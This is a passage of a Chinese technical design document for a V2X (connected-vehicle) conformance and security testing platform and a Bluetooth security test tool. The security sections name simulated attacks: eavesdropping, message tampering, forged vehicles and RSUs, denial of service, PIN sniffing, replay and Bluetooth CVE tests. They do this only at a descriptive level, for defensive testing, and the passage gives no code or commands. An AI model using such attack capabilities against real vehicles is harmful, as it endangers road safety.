记录、配置管理、安全机制等支持功能，它们帮助维护系统的正常运行，提供必要的测试信息，并确保通信的安全性。</p><p>基于这些硬件和软件组件，相符性测试工具能够执行一系列的测试案例，以验证V2X系统的实现是否遵循了相应的标准和规范。这些测试覆盖了从物理层到应用层的各个方面，确保了系统的全面性和准确性。通过这些测试，可以确保V2X系统在实际部署前的性能和可靠性，从而提高道路安全和提升交通效率。</p><h4 id="消息转发模块"><a href="#消息转发模块" class="headerlink" title="消息转发模块"></a>消息转发模块</h4><h5 id="功能实施方案-36"><a href="#功能实施方案-36" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供的消息转发模块能够支持通过TCP/IP有线通信和软件测试系统之间的通信，支撑测试所需的数据通信。具备以下功能：</p><p>支持与软件测试系统之间的TCP/IP有线通信，确保稳定的数据传输。</p><p>与软件测试系统之间的通信应符合TCI标准，确保消息格式的一致性和正确性。</p><p>当软件测试系统发送消息时，该模块将以TCP/IP报文的payload形式接收并转发给数据处理模块。</p><p>模块具备解析符合TCI标准的消息的能力，将解析出的要发送的消息透传给数据处理模块。</p><p>当V2X测试模拟设备接收到V2X报文时，该模块能够将其转换为符合TCI标准的TCP/IP报文，并发送给软件测试系统。</p><h5 id="技术实现内容-33"><a href="#技术实现内容-33" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>该模块实现消息转发模块支持通过TCP/IP有线和软件测试系统之间通信。</p><p>V2X测试模拟设备的消息转发模块和软件测试系统之间通过TCP/IP有线通信，和软件测试系统之间符合TCI标准，当软件测试系统发送消息时，将消息内容以TCP/IP报文的payload形式发送给该模块。该模块将符合TCI标准的消息解析，解析出要发送的消息透传给数据处理模块；同时，当V2X测试模拟设备接收到V2X报文时，需要将V2X转换给符合TCI标准的TCP/IP报文发送给软件测试系统。</p><p>为了实现这一要求，消息转发模块需要具备以下关键功能：</p><p>1. TCP/IP通信能力：模块必须能够通过TCP/IP协议进行有线通信，这意味着它需要能够建立和维护TCP连接，发送和接收TCP数据包。</p><p>2. TCI标准的支持：TCI（Testing and Test Control Notation）是一种用于测试系统和设备之间通信的标准。消息转发模块需要能够理解和构造符合TCI标准的消息。</p><p>3. 消息解析和构造：模块需要能够解析从软件测试系统接收到的TCP/IP报文中的payload，将其转换为V2X测试模拟设备可以理解的格式，同时也需要能够将V2X设备的消息转换为符合TCI标准的TCP/IP报文发送回软件测试系统。</p><p>基于这些功能，消息转发模块的工作流程大致如下：</p><p>接收软件测试系统消息：</p><p>- 模块监听指定的TCP端口，等待软件测试系统的连接。</p><p>- 当软件测试系统建立连接并发送TCP/IP报文时，模块接收报文并提取payload。</p><p>- 模块解析payload中的TCI消息，根据TCI标准将消息内容转换为V2X模拟设备可以处理的格式。</p><p>- 转换后的消息被发送到数据处理模块，进一步处理后发送到V2X模拟设备。</p><p>发送消息到软件测试系统：</p><p>- 当V2X测试模拟设备产生要发送的消息时，数据处理模块将消息处理成符合V2X标准的格式。</p><p>- 消息转发模块将这些V2X消息转换为符合TCI标准的TCP/IP报文。</p><p>- 转换后的报文通过建立的TCP连接发送给软件测试系统。</p><p>为了实现这个功能，可能需要以下技术组件：</p><p>- TCP/IP协议栈：用于实现网络通信的基础软件组件。</p><p>- TCI解析器/构造器：用于解析和构造符合TCI标准的消息。</p><p>- 数据处理逻辑：将接收到的消息进行必要的处理，以便它们可以被正确地发送到目标设备，或将接收到的设备消息转换为适合发送的格式。</p><p>- 接口定义：明确定义消息格式、通信协议和接口规范，以确保消息的正确解析和构造。</p><p>开发此类消息转发模块时，需要密切遵循TCI标准文档，并确保模块的实现与软件测试系统兼容。此外，还需要进行充分的测试，以确保在各种情况下都能正确地处理消息。</p><h4 id="数据处理模块"><a href="#数据处理模块" class="headerlink" title="数据处理模块"></a>数据处理模块</h4><h5 id="功能实施方案-37"><a href="#功能实施方案-37" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>基于底层协议栈进行数据发送和接收，确保与待测设备之间的稳定通信。对接收到的数据进行处理和分析，以满足测试需求并提取有用信息。根据实际测试需求，对发送的数据进行相应的处理，确保数据的准确性和有效性。</p><h4 id="协议栈模块"><a href="#协议栈模块" class="headerlink" title="协议栈模块"></a>协议栈模块</h4><h5 id="功能实施方案-38"><a href="#功能实施方案-38" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>遵循V2X标准，实现包括网络层、消息层及信息安全在内的完整协议栈。</p><p>为待测设备提供稳定的无线通信协议支持，确保数据传输的可靠性和安全性。</p><p>根据V2X标准的要求，实现各种通信协议的封装、解析和传输等功能。</p><p>该模块实现符合V2X标准的协议栈，用于和待测设备之间进行V2X无线通信协议栈包括网络层、消息层及信息安全。</p><p>为确保与待测设备的无线通信符合V2X标准，需开发一套协议栈。该协议栈涵盖网络层，负责数据传输；消息层，处理消息的封装与解析；以及信息安全层，确保通信的加密与认证。这三层的协同工作保障了V2X通信的标准化执行与数据的安全性。</p><h4 id="辅助模块"><a href="#辅助模块" class="headerlink" title="辅助模块"></a>辅助模块</h4><h5 id="功能实施方案-39"><a href="#功能实施方案-39" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>具备GNSS数据处理功能，支持处理GPS数据，进行定位信息的获取、解析和处理。</p><p>具备CAN数据处理功能，支持处理CAN总线数据，进行相关数据的解析、处理和转发。</p><p>具备日志系统，记录系统运行时的各种日志信息，记录运行时各种事件数据，以便于问题跟踪和定位。</p><p>测试调试功能：提供必要的调试工具和接口，方便开发人员和测试人员进行系统调试和问题排查。</p><h5 id="技术实现内容-34"><a href="#技术实现内容-34" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>该模块实现GNSS数据处理功能、CAN数据处理功能、日志系统及测试调试功能，支持处理GPS数据、CAN总线数据、运行时产生日志及运行时问题跟踪定位功能。</p><p>该模块集成了多项关键功能，以支持V2X通信系统的测试和验证：</p><p>1. GNSS数据处理：模块能够接收和处理全球导航卫星系统（GNSS）的信号，主要用于GPS数据的获取和解析，确保位置信息的精确性。</p><p>2. CAN数据处理：模块具备处理控制器局域网络（CAN）总线数据的能力，这对于车载系统的诊断和监控至关重要。</p><p>3. 日志系统：模块具有记录操作和事件的日志系统，能够捕获运行时的数据和状态，为后续分析提供依据。</p><p>4. 测试调试功能：模块支持运行时问题的跟踪和定位，这对于测试人员来说是一个重要的功能，它可以帮助快速地识别和修复发现的问题。</p><p>这些功能的整合，使得该模块成为一个强大的工具，用于V2X通信系统的测试和验证，确保系统的可靠性和符合性。</p><h3 id="测试系统管理模块"><a href="#测试系统管理模块" class="headerlink" title="测试系统管理模块"></a>测试系统管理模块</h3><h5 id="功能实施方案-40"><a href="#功能实施方案-40" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>实现对试验管理软件的全面控制，包括打开和关闭试验、下载和更新模型等功能。</p><p>提供的管理模块具备TCI流程处理的能力，确保测试流程的准确执行和数据的正确处理。</p><p>提供系统参数配置功能，以满足测试系统的不同需求和参数设置。</p><p>具备交互接口，与测试系统的其他模块进行交互，确保数据传输和功能协同的顺畅。</p><h5 id="技术实现内容-35"><a href="#技术实现内容-35" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>该模块实现对试验管理软件的基本操作，如打开关闭试验，下载模型等。包含测试系统的TCI流程处理，系统参数配置与测试系统其它模块的交互接口。</p><p>为了支持试验管理软件的基本操作，模块需要具备以下关键功能：</p><p>1. 试验控制：模块应能够通过用户界面或自动化脚本启动和停止试验。这包括处理试验的初始化和清理流程。</p><p>2. 模型管理：模块需要提供下载和加载测试模型的功能。这通常涉及到与文件系统或网络资源的交云，以及对模型文件的解析和验证。</p><p>3. TCI流程处理：模块应实现Testing and Test Control Notation（TCI）标准，以确保与测试系统的其它部分进行标准化的通信和控制流程。</p><p>4. 系统参数配置：模块应允许用户或其他系统模块配置和修改系统参数，包括硬件设置、网络配置、测试参数等。</p><p>5. 交互接口：模块需要定义和实现与测试系统其它模块交互的接口，涉及API调用、消息队列或其他形式的进程间通信。</p><p>综合这些功能，模块能够提供一个完整的试验管理解决方案，支持从试验的准备、执行到结束的全过程，同时提供必要的配置和扩展性以适应不同的测试需求。</p><h3 id="测试系统执行模块"><a href="#测试系统执行模块" class="headerlink" title="测试系统执行模块"></a>测试系统执行模块</h3><h5 id="功能实施方案-41"><a href="#功能实施方案-41" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>能够实现数据结构转换适配器，以确保不同数据格式之间的转换和兼容性。</p><p>提供抽象测试套件，以简化测试的组织和管理。</p><p>实现测试运行态控制器，以控制测试的执行状态和流程。</p><p>支持测试执行计划的配置，使用户可以根据测试需求定制每次测试的范围、顺序和次数等。</p><p>相关配置计划可以保存，以便后续使用和参考。</p><h5 id="技术实现内容-36"><a href="#技术实现内容-36" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>该模块实现测试系统的数据结构转换适配器，抽象测试套件，测试运行态控制器，支持测试执行计划的配置功能，支持根据测试需求定制每次测试执行的范围和每条测试程序执行的顺序、次数等，相关配置计划可以保存。</p><p>该模块作为测试系统的核心组成部分，需要包含以下关键组件和功能：</p><p>1. 数据结构转换适配器：负责在不同的数据格式和系统表示之间转换数据，确保测试数据能够在各个组件和系统之间无缝流动。</p><p>2. 抽象测试套件：提供一套通用的测试接口和模板，允许测试人员根据不同的测试需求快速配置和部署测试套件。</p><p>3. 测试运行态控制器：控制测试的执行流程，包括启动测试、监控测试状态、处理测试结果和停止测试。</p><p>4. 测试执行计划配置：允许用户或测试人员配置测试计划，包括选择要执行的测试案例、定义执行顺序、设置执行次数等。</p><p>5. 定制测试执行范围：支持根据特定的测试需求定制每次测试的执行范围，以便进行针对性的测试。</p><p>6. 保存配置计划：提供功能以保存相关的测试配置和执行计划，使其可用于未来的测试重复使用或作为模板。</p><p>通过这些组件和功能，该模块能够提供灵活的测试执行环境，支持高度定制的测试场景，并且通过保存配置计划，增强了测试的可重复性和效率。</p><h3 id="测试系统报告生成模块"><a href="#测试系统报告生成模块" class="headerlink" title="测试系统报告生成模块"></a>测试系统报告生成模块</h3><h5 id="功能实施方案-42"><a href="#功能实施方案-42" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>能够根据测试内容和结果自动生成详细的测试报告。</p><p>提供友好的用户界面，使报告易于阅读和理解。</p><p>能够支持测试报告的下载和导出，以便于用户对报告进行进一步的分析和处理。</p><p>提供多种导出格式选项，以满足不同用户的需求。</p><h3 id="V2X安全演示功能"><a href="#V2X安全演示功能" class="headerlink" title="V2X安全演示功能"></a>V2X安全演示功能</h3><h5 id="功能实施方案-43"><a href="#功能实施方案-43" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>窃听演示：模拟窃听攻击，展示如何截取和监听V2X通信中的敏感信息。</p><p>篡改攻击演示：演示如何篡改正常的V2X通信内容，并展示潜在的安全风险。</p><p>伪造车辆攻击演示：模拟伪造车辆攻击的行为，展示如何利用伪造车辆攻击。</p><p>伪造RSU攻击演示：模拟伪造RSU的行为，展示如何利用伪造RSU进行干扰和欺骗攻击。</p><p>防护演示：展示针对上述安全威胁的有效防护措施和方法。</p><h5 id="技术实现内容-37"><a href="#技术实现内容-37" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>该模块实现窃听演示、篡改攻击演示、伪造车辆攻击演示、伪造RSU攻击演示、防护演示。</p><p>该模块设计为一个综合性的安全测试平台，具有以下关键功能：</p><p>1. 窃听演示：模拟攻击者监听V2X通信，展示如何捕获和分析传输中的数据，用于教育用户关于通信隐私的重要性和窃听的风险。</p><p>2. 篡改攻击演示：演示攻击者如何在通信过程中修改消息的内容，包括对数据包的内容进行篡改，以及这种攻击可能对系统造成的影响。</p><p>3. 伪造车辆攻击演示：模拟一个攻击者创建虚假的车辆信息，比如位置、速度等，来误导其他车辆或基础设施，展示这种攻击的检测和防御机制。</p><p>4. 伪造RSU攻击演示：模拟攻击者伪造道路侧单元（Road-Side Units, RSU）的消息，展示这种攻击如何影响车辆行为以及如何通过安全机制来防范。</p><p>5. 防护演示：展示在V2X通信中实施的安全防护措施，如加密、认证、完整性校验等，以及这些措施如何有效防止上述攻击。</p><p>该模块不仅能够用于演示潜在的安全威胁，还能够展示如何部署有效的安全措施来提高V2X系统的安全性。通过这些演示，它可以作为一个教育和测试工具，帮助开发者和研究者理解并改进V2X通信系统的安全性。</p><h3 id="V2X安全检测平台-1"><a href="#V2X安全检测平台-1" class="headerlink" title="V2X安全检测平台"></a>V2X安全检测平台</h3><h4 id="功能实施方案-44"><a href="#功能实施方案-44" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>（1）适用范围：支持OBU和RSU测试。平台具备支持OBU和RSU测试的能力，能够全面覆盖V2X通信中的不同设备进行测试。通过该平台，用户可以对OBU和RSU进行全面的测试，确保其符合相关标准和规范的要求。这种广泛的适用范围为用户提供了更多的选择和灵活性，有助于提高测试效率和准确性。</p><p>（2）接口参数：支平台支持的LTE-V技术是一种先进的通信技术，能够提供更高速、更可靠的数据传输。通过嵌入式API，用户可以方便地进行二次开发，定制特定的测试功能和接口。同时，平台支持以太网、串口、USB和CAN等多种网络数据接口，满足不同设备的连接需求。这些接口使得平台能够与各种外部设备和传感器进行高速、稳定的数据交换，实现全面的测试功能。</p><p>（3）可扩展性：平台提供回调接口，推送检测结果到外部平台。接口类型支持开发方自定义。平台提供所需的所有检测工具，测试用例代码，平台支持手动调试及二次开发。平台具备高度的可扩展性，提供回调接口以推送检测结果到外部平台，通过这些回调接口，用户可以将检测结果推送到外部平台进行进一步处理或分析，实现测试数据的共享和利用。可以根据需求自定义接口类型，允许用户根据实际需求进行定制开发。平台能够提供全面的检测工具和测试用例代码，支持手动调试和二次开发，以满足不断变化的测试需求。</p><p>（4）V2X安全机制验证：基于PKI/CA技术的授权证书管理、消息签名验证、假名证书变更策略、重放防御等机制，结合OBU、RSU设备，验证V2X安全方案。平台具备验证V2X安全机制的能力，包括基于PKI/CA技术的授权证书管理、消息签名验证、假名证书变更策略以及重放防御等。通过与OBU、RSU设备的结合，全面验证V2X安全方案的实施效果和安全性。</p><p>（5）系统网络：整个系统支持Wi-Fi无线网络搭建，Wi-Fi路由器开启热点接入功能。平台支持Wi-Fi无线网络的搭建，并能通过Wi-Fi路由器开启热点接入功能，确保测试过程中的网络稳定性和兼容性。这种灵活性使得用户能够根据实际需求配置和调整测试环境，实现快速、高效的测试过程。同时，平台还支持多种网络协议和通信方式，能够适应不同的网络环境和通信需求。这种强大的网络功能使得用户可以在各种复杂的环境下进行可靠的测试和验证。</p><p>（6）V2X通信身份认证测试：提供的平台支持测试合法证书、无效证书或非法证书。平台具备V2X通信身份认证测试的能力，能够测试合法证书、无效证书以及非法证书等不同情况下的认证效果，以确保V2X通信的安全性。</p><p>（7）构建V2X标准协议相符性测试系统</p><p>提供的平台能够在实验室环境下构建用于验证V2X无线通信设备的标准协议相符性测试系统。平台能够在实验室环境下构建V2X标准协议相符性测试系统，以通过模拟各种实际场景和条件，对V2X设备进行严格的测试和验证，确保其符合相关标准和规范的要求。这种测试系统有助于提高设备的一致性和互操作性，促进V2X技术的广泛应用和发展。同时，平台还支持自动化的测试流程和报告生成功能，使用户能够快速获取准确的测试结果和报告，提高测试的效率和可靠性。便对V2X无线通信设备的协议一致性进行验证和测试。</p><p>（8）测试组件实现</p><ol><li>安全层协议一致性测试及协议变异</li></ol><p>在安全层测试中，平台能够使用LTE-V2X通信安全协议一致性测试文件夹中的TCI指令对被测设备进行控制。测试用例包括签发SPDU测试、验签SPDU测试及安全消息验证测试。这些测试用例旨在验证被测设备在安全层协议一致性方面的表现。详细接口规范参考《基于LTE的车联网无线通信技术 通信安全协议一致性测试控制接口规范_202008》设计实现，满足该规范。平台能够确保与该规范的一致性，并提供相应的测试工具和功能，以确保V2X通信的安全性。</p><ol start="2"><li>隐私保护测试及协议变异</li></ol><p>在消息层测试中，平台能够使用LTE-V2X消息层协议一致性测试文件夹中的TCI指令对被测设备进行控制。对于OBU设备，能够执行发送BSM测试。这些测试用例旨在验证被测设备在消息层协议一致性和隐私保护方面的表现。详细接口规范参考《基于LTE的车联网无线通信技术 通信安全隐私保护测试控制接口规范_202206》设计实现，能够满足该规范。平台确保与该规范的一致性，并提供相应的测试工具和功能，以确保V2X通信的隐私保护效果。</p><p>（9）自动化测试</p><p>平台支持自动化测试功能，使得V2X标准相符性测试系统与被测设备之间能够按照测试控制接口实现自动化测试。这可以提高测试效率和准确性，减少人工干预，确保测试的一致性和可靠性。平台能够提供相应的自动化测试工具和脚本，以便进行自动化测试的执行和结果分析。</p><ol><li>V2X通信拒绝服务攻击识别：平台能够支持构建不少于150辆可与测试车辆正常通信的虚拟车辆，并能够任选一辆虚拟车辆发起拒绝服务攻击。通过这种方式，平台可以验证被测车辆对恶意的V2X消息数据的识别功能。平台应具备拒绝服务攻击模拟和防御机制测试的能力，以确保被测车辆在遭受拒绝服务攻击时能够正确识别并采取相应的防御措施。这有助于提高V2X通信系统的健壮性和安全性。</li></ol><h4 id="V2X安全检测平台技术方案"><a href="#V2X安全检测平台技术方案" class="headerlink" title="V2X安全检测平台技术方案"></a>V2X安全检测平台技术方案</h4><p>1.概述</p><p>本技术方案旨在构建一个全面的V2X（Vehicle-to-Everything）安全检测平台，以支持OBU（On-Board Unit）和RSU（Road-Side Unit）的综合测试。该平台提供多层次的安全验证，包括身份认证、消息签名和隐私保护等，以确保V2X通信的安全性和可靠性。</p><p>2. 方案组成</p><p>2.1 适用范围</p><p>支持OBU和RSU测试，确保覆盖车辆与基础设施之间的所有通信安全测试需求。</p><p>2.2 接口参数</p><p>支持LTE-V标准，以确保与当前车联网通信技术的兼容性。</p><p>提供嵌入式API和支持二次开发，以适应各种定制化测试需求。</p><p>提供以太网、串口、USB和CAN等多种的网络数据接口，实现与各类设备的高效连接。</p><p>2.3 可扩展性</p><p>平台提供回调接口，推送检测结果到外部平台，以便于集成和数据共享。</p><p>接口类型支持开发方自定义，提供灵活性以适应不同的测试场景。</p><p>平台提供所需的所有检测工具和测试用例代码，支持手动调试及二次开发。</p><p>2.4 V2X安全机制验证</p><p>利用PKI/CA技术对各式各样的授权证书进行分类管理，确保所有通信实体的合法性。</p><p>消息签名验证，以验证消息的完整性和非抵赖性。</p><p>假名证书变更策略，以保护用户隐私。</p><p>重放防御机制，防止旧消息的重新发送造成的安全威胁。</p><p>结合OBU、RSU设备，全面验证V2X安全方案。</p><p>2.5 系统网络</p><p>整个系统支持Wi-Fi无线网络搭建，实现灵活的测试环境部署。</p><p>Wi-Fi路由器开启热点接入功能，便于测试设备的快速接入和通信。</p><p>2.6 V2X通信身份认证测试</p><p>支持测试合法证书、无效证书或非法证书，以验证身份认证机制的有效性。</p><p>2.7 构建V2X标准协议相符性测试系统</p><p>在实验室环境下构建用于验证V2X无线通信设备的标准协议相符性测试系统。</p><p>2.8 测试组件实现</p><p>安全层协议一致性测试及协议变异</p><p>使用LTE-V2X通信安全协议一致性测试文件夹中的TCI指令控制被测设备。</p><p>测试用例分为：签发SPDU测试、验签SPDU测试及安全消息验证测试。详细接口规范参考《基于LTE的车联网无线通信技术 通信安全协议一致性测试控制接口规范_202008》。</p><p>隐私保护测试及协议变异</p><p>消息层测试中，使用LTE-V2X消息层协议一致性测试文件夹中的TCI指令控制OBU，发送BSM测试。</p><p>详细接口规范参考《基于LTE的车联网无线通信技术 通信安全隐私保护测试控制接口规范_202206》。</p><p>2.9 自动化测试方案</p><p>V2X标准相符性测试系统与被测试设备间遵照测试控制接口实现自动化测试。</p><p>V2X通信拒绝服务攻击识别：支持构建150辆可与测试车辆正常通信的虚拟车辆，可以任选一辆虚拟车辆发起拒绝服务攻击，验证车辆对恶意的V2X消息数据的识别功能。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/28b83ff45c003265760264e6385e426d.png" alt="1703520111701"></p><p>V2X通信拓扑</p><p>软件功能</p><p>图形用户界面(GUI): 提供直观的操作界面，实现一键式测试流程，用户可通过GUI监控实时数据、配置测试参数和查看历史记录。</p><p>协议栈管理: 支持各类V2X通信协议的配置，包括但不限于IEEE 1609系列、ISO CALM系列等。</p><p>自动化测试: 支持用户自定义测试脚本，实现自动化测试。</p><p>模式切换: 用户可根据测试需求，轻松切换仿真模式和实车测试模式。</p><p>测试场景</p><p>预定义场景: 提供一系列的标准测试场景，如紧急制动、车道变更、交通信号优先等。</p><p>场景编辑器: 用户可以通过场景编辑器自定义复杂的交通场景，以模拟现实世界中的各种情况。</p><p>第三方仿真软件集成: 支持与SUMO等仿真软件的接口，实现更加复杂的交通流模拟。</p><p>数据分析与报告</p><p>实时监控: 实时捕获和显示V2X通信数据，包括消息内容、发送/接收时间等。</p><p>性能评估: 通过分析通信延迟、丢包率、吞吐量等关键性能指标，评估V2X系统性能。</p><p>报告生成: 自动化生成测试报告，包括图表和关键性能指标，以便于技术人员分析和决策。</p><p>安全性测试</p><p>安全协议测试: 测试V2X通信中的加密、签名和认证机制。</p><p>SCMS支持: 集成安全凭证管理系统，用于测试和验证V2X消息的安全性。</p><p>攻击模拟: 模拟各种安全攻击场景，如重放攻击、欺骗攻击等，以验证系统的安全性</p><p>本V2X安全检测平台将为车联网的安全性提供全面的测试解决方案，通过模拟各种攻击场景和协议不一致性，确保V2X系统的健壮性和可靠性。此外，平台的高度可扩展性和自动化测试能力将极大提高测试效率，为V2X通信安全提供坚实的保障。</p><h1 id="智能汽车网络靶场工具库-业务安全测试工具"><a href="#智能汽车网络靶场工具库-业务安全测试工具" class="headerlink" title="智能汽车网络靶场工具库-业务安全测试工具"></a>智能汽车网络靶场工具库-业务安全测试工具</h1><h2 id="技术路线-6"><a href="#技术路线-6" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="蓝牙安全测试工具"><a href="#蓝牙安全测试工具" class="headerlink" title="蓝牙安全测试工具"></a>蓝牙安全测试工具</h3><h4 id="工具概述"><a href="#工具概述" class="headerlink" title="工具概述"></a>工具概述</h4><p>蓝牙安全测试工具同时支持对低功耗蓝牙和经典蓝牙的测试，满足对智能网联汽车的蓝牙通信模块进行全面的合规及渗透测试能力。</p><h4 id="功能实施方案-45"><a href="#功能实施方案-45" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>产品信息如下：</p><p>品牌：国利</p><p>型号：GLBT226</p><p>数量：2套</p><p>指标参数信息如下：</p><ol><li>设备采用了轻便、紧凑的便携式设计风格，使其易于携带和使用。其外观简约时尚，提供了更加舒适的使用体验；</li><li>支持1路以太网口，可自适应10M、100M和1000M三种速率，适用于不同的网络环境，提供更加灵活的连接方式；</li><li>支持对经典蓝牙和低功耗蓝牙进行安全测试，可以帮助用户评估蓝牙设备的安全性，保护用户的隐私和数据安全；</li><li>支持显示蓝牙地址、蓝牙名称和RSSI信号强度等信息，可以帮助用户更好地了解蓝牙设备的状态和性能，提供更加便捷的蓝牙连接和管理方式；</li><li>支持经典蓝牙数据加密测试，可以帮助用户评估蓝牙设备的安全性，保护用户的隐私和数据安全。经典蓝牙数据加密测试可以检测蓝牙设备是否支持数据加密功能，以及加密算法的强度和安全性；</li><li>支持经典蓝牙的拒绝服务攻击测试，可以帮助用户评估蓝牙设备的安全性，检测蓝牙设备是否容易受到拒绝服务攻击。拒绝服务攻击测试可以模拟攻击者向蓝牙设备发送大量无效数据包，导致蓝牙设备无法正常工作，从而影响设备的可用性和稳定性；</li><li>支持经典蓝牙连接占用测试，可以帮助用户评估蓝牙设备的性能和稳定性，检测蓝牙设备在连接多个设备时是否会出现连接占用问题。连接占用测试可以模拟多个蓝牙设备同时连接到被测试设备，检测被测试设备在连接多个设备时的性能表现和稳定性；</li><li>支持经典蓝牙协议栈漏洞测试，包括多个漏洞测试，如CVE-2017-1000250、CVE-2017-1000251、CVE-2020-12352、CVE-2020-12351等，可以帮助用户评估蓝牙设备的安全性，检测蓝牙设备是否存在协议栈漏洞，从而提高蓝牙设备的安全性和稳定性，截图如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4fd0cf8aca8c7746014bdb08e2f58348.png"></p><p>蓝牙安全测试工具</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8e4d0467b49e0e5287cb8c4771473479.png"></p><p>被测对象、测试过程日志、测试结果</p><ol><li>支持低功耗蓝牙数据加密测试，可以帮助用户评估蓝牙设备的安全性，保护用户的隐私和数据安全。低功耗蓝牙数据加密测试可以检测蓝牙设备是否支持数据加密功能，以及加密算法的强度和安全性；</li><li>支持低功耗蓝牙BLE pin码嗅探测试，可以帮助用户评估蓝牙设备的安全性，检测蓝牙设备是否容易受到pin码嗅探攻击。pin码嗅探测试可以模拟攻击者通过监听蓝牙设备的通信流量，获取设备的pin码信息，从而破解设备的安全保护措施；</li><li>支持低功耗蓝牙重放测试，可以帮助用户评估蓝牙设备的安全性，检测蓝牙设备是否容易受到重放攻击。重放测试可以模拟攻击者通过记录蓝牙设备的通信流量，重放已经捕获的数据包，从而欺骗设备执行非法操作；</li><li>支持低功耗蓝牙从机连接占用测试，可以帮助用户评估蓝牙设备的性能和稳定性，检测蓝牙设备在连接多个从机设备时是否会出现连接占用问题。连接占用测试可以模拟多个从机设备同时连接到被测试设备，检测被测试设备在连接多个设备时的性能表现和稳定性；</li><li>支持低功耗蓝牙的拒绝服务攻击测试，可以帮助用户评估蓝牙设备的安全性，检测蓝牙设备是否容易受到拒绝服务攻击。拒绝服务攻击测试可以模拟攻击者向蓝牙设备发送大量无效数据包，导致蓝牙设备无法正常工作，从而影响设备的可用性和稳定性；</li><li>这个设备支持低功耗蓝牙协议栈漏洞测试，包括多个漏洞测试，如CVE-2017-1000250、CVE-2017-1000251、CVE-2020-12352、CVE-2020-12351、CVE-2019-17519、CVE-2019-16336、CVE-2019-17517、CVE-2019-17518、CVE-2019-17520、CVE-2019-19195、CVE-2019-19196、CVE-2020-10061、CVE-2020-10069、CVE-2020-13594、CVE-2019-17061、CVE-2019-17060、CVE-2019-19192、CVE-2019-19193、CVE-2020-13595、CVE-2019-19194、CVE-2020-13593等，可以帮助用户评估蓝牙设备的安全性，检测蓝牙设备是否存在协议栈漏洞，从而提高蓝牙设备的安全性和稳定性；功能的界面截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8a09c549997d0ee8f39aaf6a90a9afa4.png"></p><ol><li>支持高阶功能，包括蓝牙（经典/低功耗）嗅探，可以帮助用户监测蓝牙设备的通信流量，获取设备之间的通信数据，从而更好地了解蓝牙设备的工作原理和性能表现；</li><li>支持测试对象进行新增、删除、修改或对已有测试对象的搜索，可以帮助用户更加方便地管理测试对象，提高测试效率和准确性。用户可以通过设备提供的界面进行测试对象的新增、删除和修改操作，也可以通过搜索功能快速查找已有的测试对象，从而更加方便地进行测试工作；</li><li>支持任务管理页面中可以对测试任务进行新增、编辑、删除、搜索、配置用例、开始检测、查看结果等操作，可以帮助用户更加方便地管理测试任务，提高测试效率和准确性。用户可以通过设备提供的界面进行测试任务的新增、编辑和删除操作，也可以通过搜索功能快速查找已有的测试任务，从而更加方便地进行测试工作。在任务管理页面中，用户还可以配置测试用例、开始检测、查看测试结果等操作，从而更加方便地进行测试工作；</li><li>支持测试对象与测试任务相关联，对于复杂的测试场景，一个测试对象可能需要进行多个不同类型的测试任务，即同一个测试对象可需要与多个测试任务进行对应，可以帮助用户更加方便地管理测试对象和测试任务，提高测试效率和准确性。用户可以将测试对象与测试任务进行关联，从而更加方便地进行测试工作。根据不同的测试需求，可以将多个测试任务同时与同一个测试对象进行关联，已开展相应不同方向测试需求，用户可以根据需要进行配置，从而更加灵活地进行测试工作；</li><li>支持对测试过程中产生的测试数据、操作日志的显示与导出，可以帮助用户更加方便地管理测试数据和操作记录，提高测试效率和准确性。用户可以通过设备提供的界面查看测试数据和操作日志，也可以将其导出到本地进行分析和处理；</li><li>支持测试报告的导出，导出格式为pdf，测试报告会对测试结果进行详细的分析和总结，包括测试用例的执行情况、测试数据的统计分析、测试结果的评估和建议等内容。对于不通过的测试用例，测试报告会提出修复建议，帮助用户更好地解决问题，提高设备的性能和稳定性。用户可以将测试报告导出到本地进行保存和分享；</li><li>工具采用B/S设计架构，并采用SSL加密通信方式，用户可以通过浏览器远程方便地进行管理。B/S设计架构可以帮助用户更加方便地进行设备管理，无需安装额外的客户端软件，只需要通过浏览器即可进行管理。采用SSL加密通信方式可以保证用户的数据安全和隐私保护。</li></ol><h4 id="性能实施方案"><a href="#性能实施方案" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>工具外置3根5db全向天线，可以提供更快的无线传输速度和更广的覆盖范围，可以同时支持多个设备进行无线传输，提高了网络的吞吐量和稳定性。外置3根5db全向天线可以提供更广的无线覆盖范围和更好的信号强度；</li><li>电源电压为100~240V AC，50/60Hz，采用内置通用电源设计，可以适应不同地区的电源标准，方便用户在全球范围内使用。</li></ol><h4 id="技术实现内容-38"><a href="#技术实现内容-38" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>蓝牙安全测试工具是一款便携式设备，旨在支持对经典蓝牙和低功耗蓝牙进行安全测试。该工具具备多项功能，包括蓝牙安全测试、数据加密测试、拒绝服务攻击测试、协议栈漏洞测试等。工具采用便携式设计，支持自适应以太网口，具备用户友好的界面和高级功能，以满足用户的安全测试需求。</p><h5 id="硬件方案"><a href="#硬件方案" class="headerlink" 